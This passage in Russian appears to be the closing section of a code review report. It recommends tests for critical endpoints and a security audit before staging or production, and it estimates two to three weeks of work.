3. Добавить базовые тесты для критических эндпоинтов
4. Провести security audit (pentest)
5. Только после этого - staging/production

**Estimated effort:** 2-3 недели full-time работы

---

**Контакт:** Для вопросов по ревью обращайтесь к команде разработки
**Дата следующего ревью:** После исправления критических проблем
